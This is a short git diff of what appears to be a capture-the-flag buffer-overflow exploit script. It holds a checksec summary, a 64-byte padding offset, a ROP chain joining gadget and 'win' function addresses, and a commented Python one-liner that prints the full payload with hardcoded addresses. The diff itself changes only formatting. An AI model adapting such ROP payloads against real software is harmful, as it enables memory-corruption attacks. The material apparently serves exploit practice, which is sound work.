@@ -4,7 +4,7 @@
 #   RELRO:    Partial RELRO
 #   Stack:    No canary found
 #   NX:       NX enabled
-    #PIE:     No PIE (0x400000)
+#   PIE:     No PIE (0x400000)
 
 Offset =  "A"*64
 
@@ -33,3 +33,8 @@ execute = Offset + rbp_address  + rop + win_1 + Add + win_2 + ADD_1 + win_fn
 print execute
 
 #python -c 'print( "A"*64 + "IIIIIIII" + "\xbd\x07\x40\x00\x00\x00\x00\x00"+ "\x77\x07\x40\x00\x00\x00\x00\x00" + "CCCCCCCC" + "\xb4\x07\x40\x00\x00\x00\x00\x00" +  "BBBBBBBB" + "\xbe\x07\x40\x00\x00\x00\x00\x00")'
+
+
+
+
+
